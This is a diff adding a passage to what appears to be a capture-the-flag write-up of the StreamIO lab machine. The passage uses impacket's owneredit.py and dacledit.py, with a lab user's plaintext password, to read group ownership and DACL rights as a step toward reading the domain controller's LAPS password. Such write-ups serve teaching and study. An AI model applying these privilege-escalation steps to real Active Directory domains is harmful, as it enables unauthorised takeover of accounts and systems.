@@ -614,6 +614,31 @@ And we take a look on all those other users. <strong>nikk37</strong> is, who wou
 <li>Use the newly added <strong>Core Staff</strong> account to read the LAPS password for the DC</li>
 <li>SUCCESS</li>
 </ol>
+<p>This could be done using the WinRM session of nikk37 and the credentials of JDgodd with Powershell, but... I like to do those things without using Windows too much.</p>
+<p>Shouts out to Charlie Bromberg (Shutdown) for releasing his scripts and tutorial. He recently made some pull requests to impacket, adding the ability to change the owner of an object <a href="https://github.com/SecureAuthCorp/impacket/pull/1323">1323</a> and also edit DACLs <a href="https://github.com/SecureAuthCorp/impacket/pull/1291">1291</a>. These pull requests are tutorials itself, but he also published examples at <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit</a> and <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit</a>.</p>
+<p>We start with owneredit, reading the current owner</p>
+<div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
+Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Current owner information below
+<span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
+<span class="o">[</span>*<span class="o">]</span> - sAMAccountName: JDgodd
+<span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
+</code></pre></div>
+
+<p>How about DACLs?</p>
+<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
+Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Parsing DACL
+<span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
+<span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">2</span><span class="o">]</span> info
+<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
+<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
+<span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
